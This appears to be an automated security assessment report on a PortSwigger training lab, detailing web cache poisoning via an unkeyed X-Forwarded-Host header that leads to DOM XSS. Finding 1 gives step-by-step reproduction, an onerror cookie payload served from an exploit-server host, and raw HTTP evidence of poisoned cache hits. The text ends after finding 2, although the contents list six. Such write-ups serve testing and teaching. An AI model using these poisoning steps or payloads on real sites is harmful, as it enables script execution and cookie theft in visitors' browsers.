# VERDICT Security Assessment Report

## Contents

- [Assessment Information](#assessment-information)
- [Scope](#scope)
- [Summary](#summary)
- [Findings](#findings)
    - [1. HIGH — xss-stored Web cache poisoning via unkeyed X-Forwarded-Host on GET / → persistent DOM XSS on the home page (alert(document.cookie))](#finding-1)
    - [2. HIGH — burp? Web cache poisoning (3 URLs)](#finding-2)
    - [3. LOW — burp Strict transport security not enforced (2 URLs)](#finding-3)
    - [4. INFO — burp TLS certificate](#finding-4)
    - [5. INFO — burp✓ Request URL override](#finding-5)
- [Suspected (needs manual verification)](#suspected-needs-manual-verification)
    - [6. HIGH — xss-stored DOM XSS via unkeyed X-Forwarded-Host rewriting the geolocate JSON fetch origin (web cache poisoning)](#finding-6)

## Assessment Information

| | |
|---|---|
| Assessment ID | `a-mr5yyj1k-47vmiz` |
| Target | https://0a1d009a03d75453819093a800cc00d1.web-security-academy.net/ |
| Started | 2026-07-04T06:16:22.295Z |
| Generated | 2026-07-04T07:37:09.353Z |
| Phase | report |
| Screens | 3 mapped · 3 scanned · 0 remaining |
| Hypotheses | 0 (0 confirmed) |
| Findings | 5 |
| Tooling | VERDICT |

## Scope

- **In-scope hosts**: `*.web-security-academy.net`
- **Out-of-scope hosts**: —
- **In-scope paths**: `/`
- **Out-of-scope paths**: —
- **Rate**: 30 req/min, max 2 concurrent

## Summary

5 finding(s): 2 high, 1 low, 2 info

_Plus 1 suspected lead(s) needing manual verification — listed separately below, NOT counted above._

## Findings

<a id="finding-1"></a>

### 1. [HIGH] [xss-stored] Web cache poisoning via unkeyed X-Forwarded-Host on GET / → persistent DOM XSS on the home page (alert(document.cookie))

- Screen: `(cross-screen)`
- Source: validator `claude-pilot`
- Scope basis: authorized target https://0a1d009a03d75453819093a800cc00d1.web-security-academy.net/

The home page (GET /) reflects the request's X-Forwarded-Host header into an inline script as data.host: `data = {"host":"<X-Forwarded-Host>","path":"/"}`. This value is used to build the URL that /resources/js/geolocate.js fetches the geolocation JSON from, and geolocate.js assigns the fetched `country` field straight into the DOM via innerHTML: `div.innerHTML = 'Free shipping to ' + j.country` (an HTML-injection/DOM-XSS sink).

X-Forwarded-Host is NOT part of the cache key (unkeyed). The response is normally uncacheable because it emits Set-Cookie, but the "strict cacheability" is bypassed by sending the poison request WITH an existing valid session cookie — the origin then omits Set-Cookie and the CDN caches the response. A subsequent CLEAN request (no X-Forwarded-Host) to the same URL is served the poisoned copy, so the attacker-controlled data.host is delivered to other visitors of the shared home page.

Full impact chain: an attacker (1) hosts /resources/json/geolocate.json on their exploit server (https://exploit-0ade00f003df548e813c92c101a20056.exploit-server.net) returning `{"country":"<img src=x onerror=alert(document.cookie)>"}` with Access-Control-Allow-Origin: *; (2) poisons the cache for GET / with `X-Forwarded-Host: exploit-...exploit-server.net` while presenting a session cookie so the response is cached. Any victim who then loads the home page has their browser fetch the JSON from the attacker host and render the malicious country value via innerHTML, executing attacker JavaScript (alert(document.cookie)) in the victim's session/origin. Matches the operator focus: a victim who regularly visits the home page in Chrome gets alert(document.cookie).

**Reproduction**

```
1. Obtain a valid anonymous session cookie by visiting the site once (e.g. session=198O2tf7bkcxOoOtgb2KRJ6Df8BUVDBH).
2. Confirm reflection: `GET /?cb=x` with header `X-Forwarded-Host: veritas-poison-marker.example.net` → response contains `data = {"host":"veritas-poison-marker.example.net","path":"/"}` (evidence ev-mr61955q-29). Because the request carried the session cookie, the response has NO Set-Cookie and is cacheable.
3. Poison confirmed: `GET /?cb=x` with NO X-Forwarded-Host (only the session cookie) → served the cached poisoned `data.host = veritas-poison-marker.example.net` with no Set-Cookie = cache HIT (evidence ev-mr619f37-2a). A request that never sent the header received attacker-injected content.
4. Automated proof (probe_scenario): control = clean read (marker absent, ev-mr61cgjk-2d); exploit = poison-then-clean-read of the same key, x2 replays, both return the injected host veritas-wcp-7x7x.example.net (ev-mr61cp3a-2f, ev-mr61cxls-2h).
5. Weaponize: on the exploit server serve /resources/json/geolocate.json = `{"country":"<img src=1 onerror=alert(document.cookie)>"}` (with `Access-Control-Allow-Origin: *`), then poison GET / with `X-Forwarded-Host: exploit-0ade00f003df548e813c92c101a20056.exploit-server.net`. Victims loading the home page fetch the JSON cross-origin and geolocate.js writes it to innerHTML → alert(document.cookie) executes in their browser.
Supporting: geolocate.js innerHTML sink captured in ev-mr60vq1g-21; the injected data.host is the sole host reflection on the page and is what initGeoLocate() uses to build the JSON fetch URL.
```

**Evidence**

- Evidence `ev-mr61cgjk-2d` — `artifacts/_/ev-mr61cgjk-2d/`

Request:

```http
GET /?cb=vscnCtl7x HTTP/1.1
Host: 0a1d009a03d75453819093a800cc00d1.web-security-academy.net
user-agent: verdict-scanner/0.1
x-verdict: assessment
Cookie: <redacted>
```

Response:

```http
HTTP/1.1 200
age: 0
cache-control: max-age=30
content-length: 12371
content-type: text/html; charset=utf-8
x-cache: miss
x-frame-options: SAMEORIGIN

<!DOCTYPE html>
<html>
<!--LAB_HEAD_START-->
    <head>
        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>
        <link href=/resources/css/labsEcommerce.css rel=stylesheet>
        <script>
            data = {"host":"0a1d009a03d75453819093a800cc00d1.web-security-academy.net","path":"/"}
        </script>
        <title>Mystery challenge</title>
    </head>
<!--LAB_HEAD_END-->
    <body>
        <script type="text/javascript" src="/resources/js/geolocate.js"></script>
        <script src="/resources/labheader/js/labHeader.js"></script>
        <!--LAB_HEADER_START-->
        <div id="academyLabHeader">
            <section class='academyLabBanner'>
                <div class=container>
                    <div class=logo></div>
                        <div class=title-container>
                            <h2>Mystery challenge</h2>
                            <a id='exploit-link' class='button' target='_blank' href='https://exploit-0ade00f003df548e813c92c101a20056.exploit-server.net'>Go to exploit server</a>
                            <button id='submitSolution' class='button' method='POST' path='/submitSolution' parameter='answer' data-answer-prompt='Solution (may not be required, depending on lab - reveal objective for more information)'>Submit solution</button>
                            <script src='/resources/labheader/js/submitSolution.js'></script>
                            <a class=link-back href='https://portswigger.net/web-security/dashboard'>
                                Back&nbsp;to&nbsp;lab&nbsp;dashboard&nbsp;
                                <svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow>
                                    <g>
                                        <polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'></polygon>
                                        <polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'></polygon>
                                    </g>
                                </svg>
                            </a>
                            <br/><div id=mysteryObjective><a id=mysteryReveal data-hidden-objective='VGhlIHZpY3RpbSB1c2VyIHJlZ3VsYXJseSB2aXNpdHMgdGhlIGhvbWUgcGFnZSB1c2luZyBDaHJvbWUuIEludm9rZSA8Y29kZT5hbGVydChkb2N1bWVudC5jb29raWUpPC9jb2RlPiBpbiB0aGVpciBicm93c2VyLg==' data-hidden-link='aHR0cHM6Ly9wb3J0c3dpZ2dlci5uZXQvd2ViLXNlY3VyaXR5L3dlYi1jYWNoZS1wb2lzb25pbmcvZXhwbG9pdGluZy1kZXNpZ24tZmxhd3MvbGFiLXdlYi1jYWNoZS1wb2lzb25pbmctdG8tZXhwbG9pdC1hLWRvbS12dWxuZXJhYmlsaXR5LXZpYS1hLWNhY2hlLXdpdGgtc3RyaWN0LWNhY2hlYWJpbGl0eS1jcml0ZXJpYQ=='>
                                Reveal&nbsp;objective&nbsp;
                            </a></div>
                            <script src='/resources/labheader/js/mysteryObjective.js'></script>
                        </div>
                        <div class='widgetcontainer-lab-status is-notsolved'>
                            <span>LAB</span>
                            <p>Not solved</p>
                            <span class=lab-status-icon></span>
                        </div>
                    </div>
                </div>
            </section>
        </div>
        <!--LAB_HEADER_END-->
        <div theme="ecommerce">
            <section class="maincontainer">
                <div class="container">
                    <header class="navigation-header">
                        <div id=shipping-info class=shipping-info>
                        </div>
                        <section class="top-links">
                            <a href=/>Home</a><p>|</p>
                            <a href="/my-account">My account</a><p>|</p>
                        </section>
                    </header>
                    <header class="notification-header">
                    </header>
                    <section class="ecoms-pageheader">
                        <img src="/resources/images/shop.svg">
                    </section>
                    <section class="container-list-tiles">
                        <div>
                            <img src="/image/productcatalog/products/40.jpg">
                            <h3>Sarcastic 9 Ball</h3>
                            <img src="/resources/images/rating2.png">
                            $98.00
                            <a class="button" href="/product?productId=1">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/53.jpg">
                            <h3>High-End Gift Wrapping</h3>
                            <img src="/resources/images/rating2.png">
                            $82.92
                            <a class="button" href="/product?productId=2">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/47.jpg">
                            <h3>3D Voice Assistants</h3>
                            <img src="/resources/images/rating5.png">
                            $73.51
                            <a class="button" href="/product?productId=3">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/38.jpg">
                            <h3>Six Pack Beer Belt</h3>
                            <img src="/resources/images/rating5.png">
                            $74.75
                            <a class="button" href="/product?productId=4">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/27.jpg">
                            <h3>The Trolley-ON</h3>
                            <img src="/resources/images/rating1.png">
                            $55.99
                            <a class="button" href="/product?productId=5">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/64.jpg">
                            <h3>Hexbug Battleground Tarantula Double Pack</h3>
                            <img src="/resources/images/rating2.png">
                            $53.83
                            <a class="button" href="/product?productId=6">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/21.jpg">
                            <h3>Snow Delivered To Your Door</h3>
                            <img src="/resources/images/rating1.png">
                            $69.65
                            <a class="button" href="/product?productId=7">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/57.jpg">
                            <h3>Lightbulb Moments</h3>
                            <img src="/resources/images/rating5.png">
                            $46.31
                            <a class="button" href="/product?productId=8">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/5.jpg">
                            <h3>Cheshire Cat Grin</h3>
                            <img src="/resources/images/rating5.png">
                            $38.41
                            <a class="button" href="/product?productId=9">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/12.jpg">
                            <h3>Hologram Stand In</h3>
                            <img src="/resources/images/rating4.png">
                            $94.96
                            <a class="button" href="/product?productId=10">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/13.jpg">
                            <h3>Inflatable Dartboard</h3>
                            <img src="/resources/images/rating4.png">
                            $66.51
                            <a class="button" href="/product?productId=11">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/7.jpg">
                            <h3>Conversation Controlling Lemon</h3>
                            <img src="/resources/images/rating4.png">
                            $68.79
                            <a class="button" href="/product?productId=12">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/54.jpg">
                            <h3>Robot Home Security Buddy</h3>
                            <img src="/resources/images/rating1.png">
                            $93.40
                            <a class="button" href="/product?productId=13">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/30.jpg">
                            <h3>Giant Pillow Thing</h3>
                            <img src="/resources/images/rating1.png">
                            $48.88
                            <a class="button" href="/product?productId=14">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/72.jpg">
                            <h3>Baby Minding Shoes</h3>
                            <img src="/resources/images/rating1.png">
                            $21.42
                            <a class="button" href="/product?productId=15">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/62.jpg">
                            <h3>Weird Crushes Game</h3>
                            <img src="/resources/images/rating1.png">
                            $33.47
                            <a class="button" href="/product?productId=16">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/31.jpg">
                            <h3>Couple&apos;s Umbrella</h3>
                            <img src="/resources/images/rating5.png">
                            $70.95
                            <a class="button" href="/product?productId=17">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/70.jpg">
                            <h3>Eye Projectors</h3>
                            <img src="/resources/images/rating1.png">
                            $12.02
                            <a class="button" href="/product?productId=18">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/45.jpg">
                            <h3>ZZZZZZ Bed - Your New Home Office</h3>
                            <img src="/resources/images/rating3.png">
                            $29.77
                            <a class="button" href="/product?productId=19">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/18.jpg">
                            <h3>Portable Hat</h3>
                            <img src="/resources/images/rating4.png">
                            $58.70
                            <a class="button" href="/product?productId=20">View details</a>
                        </div>
                    </section>
                    <script>
                        initGeoLocate('//' + data.host + '/resources/json/geolocate.json');
                    </script>
                </div>
            </section>
            <div class="footer-wrapper">
            </div>
        </div>
    </body>
</html>
```

- Evidence `ev-mr61cp3a-2f` — `artifacts/_/ev-mr61cp3a-2f/`

Request:

```http
GET /?cb=vscnExp7x HTTP/1.1
Host: 0a1d009a03d75453819093a800cc00d1.web-security-academy.net
user-agent: verdict-scanner/0.1
x-verdict: assessment
Cookie: <redacted>
```

Response:

```http
HTTP/1.1 200
age: 6
cache-control: max-age=30
content-length: 12342
content-type: text/html; charset=utf-8
x-cache: hit
x-frame-options: SAMEORIGIN

<!DOCTYPE html>
<html>
<!--LAB_HEAD_START-->
    <head>
        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>
        <link href=/resources/css/labsEcommerce.css rel=stylesheet>
        <script>
            data = {"host":"veritas-wcp-7x7x.example.net","path":"/"}
        </script>
        <title>Mystery challenge</title>
    </head>
<!--LAB_HEAD_END-->
    <body>
        <script type="text/javascript" src="/resources/js/geolocate.js"></script>
        <script src="/resources/labheader/js/labHeader.js"></script>
        <!--LAB_HEADER_START-->
        <div id="academyLabHeader">
            <section class='academyLabBanner'>
                <div class=container>
                    <div class=logo></div>
                        <div class=title-container>
                            <h2>Mystery challenge</h2>
                            <a id='exploit-link' class='button' target='_blank' href='https://exploit-0ade00f003df548e813c92c101a20056.exploit-server.net'>Go to exploit server</a>
                            <button id='submitSolution' class='button' method='POST' path='/submitSolution' parameter='answer' data-answer-prompt='Solution (may not be required, depending on lab - reveal objective for more information)'>Submit solution</button>
                            <script src='/resources/labheader/js/submitSolution.js'></script>
                            <a class=link-back href='https://portswigger.net/web-security/dashboard'>
                                Back&nbsp;to&nbsp;lab&nbsp;dashboard&nbsp;
                                <svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow>
                                    <g>
                                        <polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'></polygon>
                                        <polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'></polygon>
                                    </g>
                                </svg>
                            </a>
                            <br/><div id=mysteryObjective><a id=mysteryReveal data-hidden-objective='VGhlIHZpY3RpbSB1c2VyIHJlZ3VsYXJseSB2aXNpdHMgdGhlIGhvbWUgcGFnZSB1c2luZyBDaHJvbWUuIEludm9rZSA8Y29kZT5hbGVydChkb2N1bWVudC5jb29raWUpPC9jb2RlPiBpbiB0aGVpciBicm93c2VyLg==' data-hidden-link='aHR0cHM6Ly9wb3J0c3dpZ2dlci5uZXQvd2ViLXNlY3VyaXR5L3dlYi1jYWNoZS1wb2lzb25pbmcvZXhwbG9pdGluZy1kZXNpZ24tZmxhd3MvbGFiLXdlYi1jYWNoZS1wb2lzb25pbmctdG8tZXhwbG9pdC1hLWRvbS12dWxuZXJhYmlsaXR5LXZpYS1hLWNhY2hlLXdpdGgtc3RyaWN0LWNhY2hlYWJpbGl0eS1jcml0ZXJpYQ=='>
                                Reveal&nbsp;objective&nbsp;
                            </a></div>
                            <script src='/resources/labheader/js/mysteryObjective.js'></script>
                        </div>
                        <div class='widgetcontainer-lab-status is-notsolved'>
                            <span>LAB</span>
                            <p>Not solved</p>
                            <span class=lab-status-icon></span>
                        </div>
                    </div>
                </div>
            </section>
        </div>
        <!--LAB_HEADER_END-->
        <div theme="ecommerce">
            <section class="maincontainer">
                <div class="container">
                    <header class="navigation-header">
                        <div id=shipping-info class=shipping-info>
                        </div>
                        <section class="top-links">
                            <a href=/>Home</a><p>|</p>
                            <a href="/my-account">My account</a><p>|</p>
                        </section>
                    </header>
                    <header class="notification-header">
                    </header>
                    <section class="ecoms-pageheader">
                        <img src="/resources/images/shop.svg">
                    </section>
                    <section class="container-list-tiles">
                        <div>
                            <img src="/image/productcatalog/products/40.jpg">
                            <h3>Sarcastic 9 Ball</h3>
                            <img src="/resources/images/rating2.png">
                            $98.00
                            <a class="button" href="/product?productId=1">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/53.jpg">
                            <h3>High-End Gift Wrapping</h3>
                            <img src="/resources/images/rating2.png">
                            $82.92
                            <a class="button" href="/product?productId=2">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/47.jpg">
                            <h3>3D Voice Assistants</h3>
                            <img src="/resources/images/rating5.png">
                            $73.51
                            <a class="button" href="/product?productId=3">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/38.jpg">
                            <h3>Six Pack Beer Belt</h3>
                            <img src="/resources/images/rating5.png">
                            $74.75
                            <a class="button" href="/product?productId=4">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/27.jpg">
                            <h3>The Trolley-ON</h3>
                            <img src="/resources/images/rating1.png">
                            $55.99
                            <a class="button" href="/product?productId=5">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/64.jpg">
                            <h3>Hexbug Battleground Tarantula Double Pack</h3>
                            <img src="/resources/images/rating2.png">
                            $53.83
                            <a class="button" href="/product?productId=6">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/21.jpg">
                            <h3>Snow Delivered To Your Door</h3>
                            <img src="/resources/images/rating1.png">
                            $69.65
                            <a class="button" href="/product?productId=7">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/57.jpg">
                            <h3>Lightbulb Moments</h3>
                            <img src="/resources/images/rating5.png">
                            $46.31
                            <a class="button" href="/product?productId=8">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/5.jpg">
                            <h3>Cheshire Cat Grin</h3>
                            <img src="/resources/images/rating5.png">
                            $38.41
                            <a class="button" href="/product?productId=9">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/12.jpg">
                            <h3>Hologram Stand In</h3>
                            <img src="/resources/images/rating4.png">
                            $94.96
                            <a class="button" href="/product?productId=10">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/13.jpg">
                            <h3>Inflatable Dartboard</h3>
                            <img src="/resources/images/rating4.png">
                            $66.51
                            <a class="button" href="/product?productId=11">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/7.jpg">
                            <h3>Conversation Controlling Lemon</h3>
                            <img src="/resources/images/rating4.png">
                            $68.79
                            <a class="button" href="/product?productId=12">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/54.jpg">
                            <h3>Robot Home Security Buddy</h3>
                            <img src="/resources/images/rating1.png">
                            $93.40
                            <a class="button" href="/product?productId=13">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/30.jpg">
                            <h3>Giant Pillow Thing</h3>
                            <img src="/resources/images/rating1.png">
                            $48.88
                            <a class="button" href="/product?productId=14">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/72.jpg">
                            <h3>Baby Minding Shoes</h3>
                            <img src="/resources/images/rating1.png">
                            $21.42
                            <a class="button" href="/product?productId=15">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/62.jpg">
                            <h3>Weird Crushes Game</h3>
                            <img src="/resources/images/rating1.png">
                            $33.47
                            <a class="button" href="/product?productId=16">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/31.jpg">
                            <h3>Couple&apos;s Umbrella</h3>
                            <img src="/resources/images/rating5.png">
                            $70.95
                            <a class="button" href="/product?productId=17">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/70.jpg">
                            <h3>Eye Projectors</h3>
                            <img src="/resources/images/rating1.png">
                            $12.02
                            <a class="button" href="/product?productId=18">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/45.jpg">
                            <h3>ZZZZZZ Bed - Your New Home Office</h3>
                            <img src="/resources/images/rating3.png">
                            $29.77
                            <a class="button" href="/product?productId=19">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/18.jpg">
                            <h3>Portable Hat</h3>
                            <img src="/resources/images/rating4.png">
                            $58.70
                            <a class="button" href="/product?productId=20">View details</a>
                        </div>
                    </section>
                    <script>
                        initGeoLocate('//' + data.host + '/resources/json/geolocate.json');
                    </script>
                </div>
            </section>
            <div class="footer-wrapper">
            </div>
        </div>
    </body>
</html>
```

- Evidence `ev-mr61cxls-2h` — `artifacts/_/ev-mr61cxls-2h/`

Request:

```http
GET /?cb=vscnExp7x HTTP/1.1
Host: 0a1d009a03d75453819093a800cc00d1.web-security-academy.net
user-agent: verdict-scanner/0.1
x-verdict: assessment
Cookie: <redacted>
```

Response:

```http
HTTP/1.1 200
age: 17
cache-control: max-age=30
content-length: 12342
content-type: text/html; charset=utf-8
x-cache: hit
x-frame-options: SAMEORIGIN

<!DOCTYPE html>
<html>
<!--LAB_HEAD_START-->
    <head>
        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>
        <link href=/resources/css/labsEcommerce.css rel=stylesheet>
        <script>
            data = {"host":"veritas-wcp-7x7x.example.net","path":"/"}
        </script>
        <title>Mystery challenge</title>
    </head>
<!--LAB_HEAD_END-->
    <body>
        <script type="text/javascript" src="/resources/js/geolocate.js"></script>
        <script src="/resources/labheader/js/labHeader.js"></script>
        <!--LAB_HEADER_START-->
        <div id="academyLabHeader">
            <section class='academyLabBanner'>
                <div class=container>
                    <div class=logo></div>
                        <div class=title-container>
                            <h2>Mystery challenge</h2>
                            <a id='exploit-link' class='button' target='_blank' href='https://exploit-0ade00f003df548e813c92c101a20056.exploit-server.net'>Go to exploit server</a>
                            <button id='submitSolution' class='button' method='POST' path='/submitSolution' parameter='answer' data-answer-prompt='Solution (may not be required, depending on lab - reveal objective for more information)'>Submit solution</button>
                            <script src='/resources/labheader/js/submitSolution.js'></script>
                            <a class=link-back href='https://portswigger.net/web-security/dashboard'>
                                Back&nbsp;to&nbsp;lab&nbsp;dashboard&nbsp;
                                <svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow>
                                    <g>
                                        <polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'></polygon>
                                        <polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'></polygon>
                                    </g>
                                </svg>
                            </a>
                            <br/><div id=mysteryObjective><a id=mysteryReveal data-hidden-objective='VGhlIHZpY3RpbSB1c2VyIHJlZ3VsYXJseSB2aXNpdHMgdGhlIGhvbWUgcGFnZSB1c2luZyBDaHJvbWUuIEludm9rZSA8Y29kZT5hbGVydChkb2N1bWVudC5jb29raWUpPC9jb2RlPiBpbiB0aGVpciBicm93c2VyLg==' data-hidden-link='aHR0cHM6Ly9wb3J0c3dpZ2dlci5uZXQvd2ViLXNlY3VyaXR5L3dlYi1jYWNoZS1wb2lzb25pbmcvZXhwbG9pdGluZy1kZXNpZ24tZmxhd3MvbGFiLXdlYi1jYWNoZS1wb2lzb25pbmctdG8tZXhwbG9pdC1hLWRvbS12dWxuZXJhYmlsaXR5LXZpYS1hLWNhY2hlLXdpdGgtc3RyaWN0LWNhY2hlYWJpbGl0eS1jcml0ZXJpYQ=='>
                                Reveal&nbsp;objective&nbsp;
                            </a></div>
                            <script src='/resources/labheader/js/mysteryObjective.js'></script>
                        </div>
                        <div class='widgetcontainer-lab-status is-notsolved'>
                            <span>LAB</span>
                            <p>Not solved</p>
                            <span class=lab-status-icon></span>
                        </div>
                    </div>
                </div>
            </section>
        </div>
        <!--LAB_HEADER_END-->
        <div theme="ecommerce">
            <section class="maincontainer">
                <div class="container">
                    <header class="navigation-header">
                        <div id=shipping-info class=shipping-info>
                        </div>
                        <section class="top-links">
                            <a href=/>Home</a><p>|</p>
                            <a href="/my-account">My account</a><p>|</p>
                        </section>
                    </header>
                    <header class="notification-header">
                    </header>
                    <section class="ecoms-pageheader">
                        <img src="/resources/images/shop.svg">
                    </section>
                    <section class="container-list-tiles">
                        <div>
                            <img src="/image/productcatalog/products/40.jpg">
                            <h3>Sarcastic 9 Ball</h3>
                            <img src="/resources/images/rating2.png">
                            $98.00
                            <a class="button" href="/product?productId=1">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/53.jpg">
                            <h3>High-End Gift Wrapping</h3>
                            <img src="/resources/images/rating2.png">
                            $82.92
                            <a class="button" href="/product?productId=2">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/47.jpg">
                            <h3>3D Voice Assistants</h3>
                            <img src="/resources/images/rating5.png">
                            $73.51
                            <a class="button" href="/product?productId=3">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/38.jpg">
                            <h3>Six Pack Beer Belt</h3>
                            <img src="/resources/images/rating5.png">
                            $74.75
                            <a class="button" href="/product?productId=4">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/27.jpg">
                            <h3>The Trolley-ON</h3>
                            <img src="/resources/images/rating1.png">
                            $55.99
                            <a class="button" href="/product?productId=5">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/64.jpg">
                            <h3>Hexbug Battleground Tarantula Double Pack</h3>
                            <img src="/resources/images/rating2.png">
                            $53.83
                            <a class="button" href="/product?productId=6">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/21.jpg">
                            <h3>Snow Delivered To Your Door</h3>
                            <img src="/resources/images/rating1.png">
                            $69.65
                            <a class="button" href="/product?productId=7">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/57.jpg">
                            <h3>Lightbulb Moments</h3>
                            <img src="/resources/images/rating5.png">
                            $46.31
                            <a class="button" href="/product?productId=8">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/5.jpg">
                            <h3>Cheshire Cat Grin</h3>
                            <img src="/resources/images/rating5.png">
                            $38.41
                            <a class="button" href="/product?productId=9">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/12.jpg">
                            <h3>Hologram Stand In</h3>
                            <img src="/resources/images/rating4.png">
                            $94.96
                            <a class="button" href="/product?productId=10">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/13.jpg">
                            <h3>Inflatable Dartboard</h3>
                            <img src="/resources/images/rating4.png">
                            $66.51
                            <a class="button" href="/product?productId=11">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/7.jpg">
                            <h3>Conversation Controlling Lemon</h3>
                            <img src="/resources/images/rating4.png">
                            $68.79
                            <a class="button" href="/product?productId=12">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/54.jpg">
                            <h3>Robot Home Security Buddy</h3>
                            <img src="/resources/images/rating1.png">
                            $93.40
                            <a class="button" href="/product?productId=13">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/30.jpg">
                            <h3>Giant Pillow Thing</h3>
                            <img src="/resources/images/rating1.png">
                            $48.88
                            <a class="button" href="/product?productId=14">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/72.jpg">
                            <h3>Baby Minding Shoes</h3>
                            <img src="/resources/images/rating1.png">
                            $21.42
                            <a class="button" href="/product?productId=15">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/62.jpg">
                            <h3>Weird Crushes Game</h3>
                            <img src="/resources/images/rating1.png">
                            $33.47
                            <a class="button" href="/product?productId=16">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/31.jpg">
                            <h3>Couple&apos;s Umbrella</h3>
                            <img src="/resources/images/rating5.png">
                            $70.95
                            <a class="button" href="/product?productId=17">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/70.jpg">
                            <h3>Eye Projectors</h3>
                            <img src="/resources/images/rating1.png">
                            $12.02
                            <a class="button" href="/product?productId=18">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/45.jpg">
                            <h3>ZZZZZZ Bed - Your New Home Office</h3>
                            <img src="/resources/images/rating3.png">
                            $29.77
                            <a class="button" href="/product?productId=19">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/18.jpg">
                            <h3>Portable Hat</h3>
                            <img src="/resources/images/rating4.png">
                            $58.70
                            <a class="button" href="/product?productId=20">View details</a>
                        </div>
                    </section>
                    <script>
                        initGeoLocate('//' + data.host + '/resources/json/geolocate.json');
                    </script>
                </div>
            </section>
            <div class="footer-wrapper">
            </div>
        </div>
    </body>
</html>
```

<a id="finding-2"></a>

### 2. [HIGH] [burp?] Web cache poisoning (3 URLs)

- Screen: `(cross-screen)`
- Source: validator `burp`
- Scope basis: burp scan (in-scope)

⚠ AI re-test could not reproduce (severity kept, manual confirmation advised): Automated re-test could not reproduce the served-from-cache effect: X-Forwarded-Host does reflect unencoded into data.host, but on Burp's own query-string cache-buster keys the response is never cached (both clean retrieves reached origin fresh, returning the legit host, not the poison), and the genuinely-cached bare / served clean copies on every attempt (poison never reached origin) — this is the lab's "strict cacheability criteria," so no clean/victim request ever received poisoned content.

